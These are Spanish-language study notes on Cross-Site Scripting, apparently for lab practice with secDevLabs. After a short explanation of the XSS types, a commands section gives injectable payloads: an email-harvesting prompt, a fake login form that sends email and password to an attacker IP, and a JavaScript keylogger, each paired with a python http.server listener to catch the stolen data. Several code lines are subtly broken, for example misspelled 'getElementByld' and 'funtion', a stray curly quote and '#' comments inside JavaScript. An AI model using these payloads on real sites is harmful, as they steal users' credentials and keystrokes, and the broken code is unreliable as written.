# Cross-Site Scripting

Tags: #XSS #OWASP #Explotacion 

Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

-   **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
-   **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
-   **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

-   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)


## Comandos 

Los XSS pueden interpretar codigo en **HTML y/o  JavaScript** y es ahi en donde podemos colocar las ineycciones.

```javascript
<script>alert("XSS")</script>                                                      # Creamos una ventana emergente con codigo javascript que dice XSS
```

Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra IP con un servidor hecho con http,  colocamos la IP de nuestro servidor en fetch
```javascript
<script>
    var email = prompt("Por favor, introduce tu correo electronico para visualizar el post", "example@example.com");

    if (email == null || email == ""){
        alert("Es necesario introducir un correo para ver el post");
    } else{
        fetch("http://192.168.68.108/?email=" + email );  
    }
</script>
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
```


Tambien lo podemos hacer con HTML (Phishing)
```html
<div id="formContainer"></div>

<script>
	var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contrasena: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';
		
	document.getElementByld(formContainer”).innerHTML = form;
	
	function submitForm() {
		email = document.getElementByld("email").value;
		password = document.getElementByld("password").value;
		fetch("http://192.168.68.108/?email=" + email + "&password="+ password);
	}
</script>
```

```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
```


Podemos crear un Keylogger JavaScript
```javascript
<script>
   var k = "";    document.onkeypress = funtion(e){
        e = e || window.event; # Opcional para que en cualquier navegador funcione el Keylogger
        k += e.key;
        var i = new Image();
        i.src = "http://192.168.68.111/" + k;
    };
</script>
```

```bash
❯ python3 -m http.server 80  | grep -oP "GET /\k[^.*\s]+"      # Nos montamos un servidor http 80 para recibir las peticiones y que las filtre 
```


ss
```javascript

```
